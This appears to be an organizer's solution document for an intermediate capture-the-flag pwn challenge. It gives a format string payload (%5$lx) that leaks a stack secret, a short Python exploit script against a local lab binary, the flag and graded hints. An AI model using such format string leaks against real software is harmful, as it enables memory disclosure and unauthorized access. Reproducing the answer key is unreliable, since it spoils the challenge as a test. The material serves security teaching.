# PWN-02 — INTERNAL SERVICE: Organizer Solution Document

## Challenge Metadata
- **ID**: PWN-02
- **Title**: INTERNAL SERVICE
- **Category**: Pwn
- **Difficulty**: Intermediate
- **Points**: 200
- **Estimated solve time**: 25–40 minutes

## Vulnerability & Concept
- **Vulnerability**: Format string vulnerability in `printf(input)`.
- **Mitigations**: Stack secret protection.

## Exact Exploitation Path
1. Pass `%5$lx` as operator ID to leak the 5th 64-bit word on the stack (which holds `secret_token = 0xA02E11A99`).
2. Read the leaked hex token from output (`A02E11A99`).
3. Enter `0xA02E11A99` at the secret prompt to pass validation and invoke `grant_access()`.

## Python Exploit Script
```python
import subprocess

p = subprocess.Popen(['./internal_service'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out, _ = p.communicate(input=b'%5$lx\n0xA02E11A99\n')
print(out.decode())
```

## Recovered Evidence & Flag
- **Flag**: `flag{Format_String_Leak_Exploit_Success}`

## Hints
1. Test user input with format specifiers like %p or %x. Notice that the program prints stack memory directly back to the terminal.
2. Locate the stack position of secret_token using specifiers like %5$lx or %6$lx.
3. Submit %5$lx as operator ID to leak the hex token 0xA02E11A99, then enter that token at the secret prompt.
